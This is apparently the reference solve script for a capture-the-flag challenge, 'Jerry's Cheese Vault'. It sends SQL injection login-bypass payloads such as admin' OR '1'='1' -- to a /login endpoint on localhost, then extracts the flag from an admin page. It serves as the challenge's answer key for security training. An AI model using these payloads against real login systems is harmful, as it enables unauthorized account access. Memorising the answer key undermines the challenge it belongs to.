#!/usr/bin/env python3
"""
Golden Solution for Jerry's Cheese Vault
- Exploits SQLi in /login to become admin
- Reads flag from /vault (admin_notes)
Usage:
  python3 golden_solution/solve.py [http://localhost:8080]
"""
import sys, re, requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
s = requests.Session()

def want(pattern, text):
    m = re.search(pattern, text, re.I|re.S)
    return m.group(0) if m else None

def main():
    print("=== Golden Solution: Jerry's Cheese Vault ===")
    # Sanity
    try:
        r = s.get(TARGET + "/_health", timeout=5)
        print("[*] Health:", r.status_code, r.text.strip())
    except Exception as e:
        print("[-] Target not reachable:", e); sys.exit(1)

    # Try SQLi
    payloads = [
        "admin' OR '1'='1' -- ",
        "admin' OR 1=1 -- ",
        "' OR '1'='1' -- ",
    ]
    for u in payloads:
        print(f"[>] SQLi login with username={u!r}")
        resp = s.post(TARGET + "/login", data={"username": u, "password": "x"}, allow_redirects=True)
        print("[*] POST /login =>", resp.status_code)

        vault = s.get(TARGET + "/vault", allow_redirects=True)
        print("[*] GET /vault =>", vault.status_code)
        if vault.status_code == 200 and "Admin Notes" in vault.text or "Flag:" in vault.text:
            flag = want(r"Exploit3rs\{[^}]+\}", vault.text)
            if flag:
                print("\n[+] FLAG FOUND:", flag)
                return
        else:
            print("[-] Not admin yet; trying next payload...")

    print("[-] Exploit did not reveal the flag. Check app/DB are seeded & reachable.")
    sys.exit(2)

if __name__ == "__main__":
    main()
